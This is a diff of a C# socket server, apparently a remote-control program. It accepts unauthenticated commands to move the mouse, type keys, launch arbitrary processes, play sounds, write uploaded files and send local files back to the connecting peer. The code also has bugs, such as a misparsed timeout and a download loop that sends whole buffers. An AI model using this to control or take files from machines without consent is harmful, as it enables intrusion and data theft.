@@ -76,7 +76,7 @@ namespace JCer
                         if (m[1] == "move" && m.Count == 4)
                         {
                             SetCursorPos(int.Parse(m[2]), int.Parse(m[3]));
-                            if (!Send(accept, "$ result = ok"))
+                            if (!Send(accept, "ok"))
                                 break;
                         }
                         else
@@ -106,12 +106,12 @@ namespace JCer
                                     keybd_event((byte)c, 0, 2, 0);
                                 }
                             }
-                            if (!Send(accept, "$ result = ok"))
+                            if (!Send(accept, "ok"))
                                 break;
                         }
                         else
                         {
-                            if (!Send(accept, "$ error = unrecognized command"))
+                            if (!Send(accept, "unrecognized command"))
                                 break;
                         }
                     }
@@ -119,9 +119,12 @@ namespace JCer
                     {
                         string arg = "";
                         for (int i = 2; i < m.Count; ++i) arg += "\"" + m[i] + "\" ";
-                        Process.Start(m[1], arg);
+                        if (arg != "")
+                            Process.Start(m[1], arg);
+                        else
+                            Process.Start(m[1]);
 
-                        if (!Send(accept, "$ result = ok"))
+                        if (!Send(accept, "ok"))
                             break;
                     }
 
@@ -132,17 +135,13 @@ namespace JCer
                         {
                             if (player.ContainsKey(m[2]))
                             {
-                                if (!Send(accept, "$ \"" + m[2] + "\" was exist :("))
+                                if (!Send(accept, "\"" + m[2] + "\" was exist :("))
                                     break;
                             }
                             else
                             {
-                                string result = "$ result = ok";
-                                try
-                                {
-                                    player.Add(m[2], new SoundPlayer(m[3])); //创建至字典
-                                }
-                                catch (Exception e) { result = "$ error = " + e.Message; }
+                                string result = "ok";
+                                player.Add(m[2], new SoundPlayer(m[3])); //创建至字典
                                 if (!Send(accept, result))
                                     break;
                             }
@@ -151,12 +150,8 @@ namespace JCer
                         {
                             if (player.ContainsKey(m[2]))
                             {
-                                string result = "$ result = ok";
-                                try
-                                {
-                                    player[m[2]].LoadTimeout = int.Parse(m[2]);
-                                }
-                                catch (Exception e) { result = "$ error = " + e.Message; }
+                                string result = "ok";
+                                player[m[2]].LoadTimeout = int.Parse(m[2]);
                                 if (!Send(accept, result))
                                     break;
                             }
@@ -167,83 +162,71 @@ namespace JCer
                         {
                             if (player.ContainsKey(m[2]))
                             {
-                                string result = "$ result = ok";
-                                try
-                                {
-                                    player[m[2]].Load();
-                                }
-                                catch (Exception e) { result = "$ error = " + e.Message; }
+                                string result = "ok";
+                                player[m[2]].Load();
                                 if (!Send(accept, result))
                                     break;
                             }
-                            else if (!Send(accept, "$ can't find \"" + m[2] + "\" :("))
+                            else if (!Send(accept, "can't find \"" + m[2] + "\" :("))
                                 break;
                         }
                         else if (m[1] == "play" && m.Count == 3)
                         {
                             if (player.ContainsKey(m[2]))
                             {
-                                string result = "$ result = ok";
-                                try
-                                {
-                                    player[m[2]].PlayLooping();
-                                }
-                                catch (Exception e) { result = "$ error = " + e.Message; }
+                                string result = "ok";
+                                player[m[2]].PlayLooping();
                                 if (!Send(accept, result))
                                     break;
                             }
-                            else if (!Send(accept, "$ can't find \"" + m[2] + "\" :("))
+                            else if (!Send(accept, "can't find \"" + m[2] + "\" :("))
                                 break;
                         }
                         else if (m[1] == "stop" && m.Count == 3)
                         {
                             if (player.ContainsKey(m[2]))
                             {
-                                string result = "$ result = ok";
-                                try
-                                {
-                                    player[m[2]].Stop();
-                                }
-                                catch (Exception e) { result = "$ error = " + e.Message; }
+                                string result = "ok";
+                                player[m[2]].Stop();
                                 if (!Send(accept, result))
                                     break;
                             }
-                            else if (!Send(accept, "$ can't find \"" + m[2] + "\" :("))
+                            else if (!Send(accept, "can't find \"" + m[2] + "\" :("))
                                 break;
                         }
                         else if (m[1] == "delete" && m.Count == 3)
                         {
                             if (player.ContainsKey(m[2]))
                             {
-                                string result = "$ result = ok";
+                                string result = "ok";
                                 player[m[2]].Dispose();
                                 player.Remove(m[2]);
                                 if (!Send(accept, result))
                                     break;
                             }
-                            else if (!Send(accept, "$ can't find \"" + m[2] + "\" :("))
+                            else if (!Send(accept, "can't find \"" + m[2] + "\" :("))
                                 break;
                         }
                         else
                         {
-                            if (!Send(accept, "$ error = unrecognized command"))
+                            if (!Send(accept, "unrecognized command"))
                                 break;
                         }
                     }
 
-                    else if (m[0] == "download" && m.Count == 4)
+                    else if (m[0] == "upload" && m.Count == 3)
                     {
                         /* 格式
-                         * download 长度 文件名
+                         * upload 长度 文件名
                          */
 
                         long totalLen = long.Parse(m[1]);
-                        using (FileStream w = new FileStream(m[3], FileMode.Create, FileAccess.Write))
+                        using (FileStream w = new FileStream(m[2], FileMode.Create, FileAccess.Write))
                         {
                             while (totalLen > 0)
                             {
                                 byte[] file = new byte[4 * 1024]; //每次接收4MB
-                                int recvLen = accept.Receive(file, totalLen < 4*1024 ? (int)totalLen : 4*1024, 0);
+                                int recvLen = accept.Receive(file, totalLen < 4 * 1024 ? (int)totalLen : 4 * 1024, 0);
                                 if (recvLen <= 0) break;
                                 Task t = w.WriteAsync(file, 0, recvLen);
                                 while (!t.IsCompleted) ;
@@ -252,19 +235,49 @@ namespace JCer
                             }
                         }
 
-                        if (!Send(accept, "$ result = ok"))
+                        if (!Send(accept, "ok"))
+                            break;
+                    }
+                    else if(m[0] == "download" && m.Count == 2)
+                    {
+                        if(!File.Exists(m[1]))
+                        {
+                            Send(accept, "error");
+                            throw new Exception("can't find the file");
+                        }
+                        using (FileStream r = new FileStream(m[1], FileMode.Open, FileAccess.Read))
+                        {
+                            Send(accept, r.Length.ToString());
+                            long len = r.Length;
+                            while (len > 0)
+                            {
+                                byte[] file = new byte[4 * 1024]; //每次发送4MB
+                                Task t = r.ReadAsync(file, 0, file.Length);
+                                while (!t.IsCompleted) ;
+
+                                int recvLen = accept.Send(file, file.Length, 0);
+                                if (recvLen <= 0) break;
+
+                                len -= recvLen;
+                            }
+                        }
+
+                        Recv(accept);
+                        if (!Send(accept, "ok"))
                             break;
                     }
                     else
                     {
-                        if (!Send(accept, "$ error = unrecognized command"))
+                        if (!Send(accept, "unrecognized command"))
                             break;
                     }
-
-                    recv = Recv(accept);
                 }
-                catch { }
-
+                catch (Exception e)
+                {
+                    if (!Send(accept, e.Message))
+                        break;
+                }
+                recv = Recv(accept);
             }
         }
 
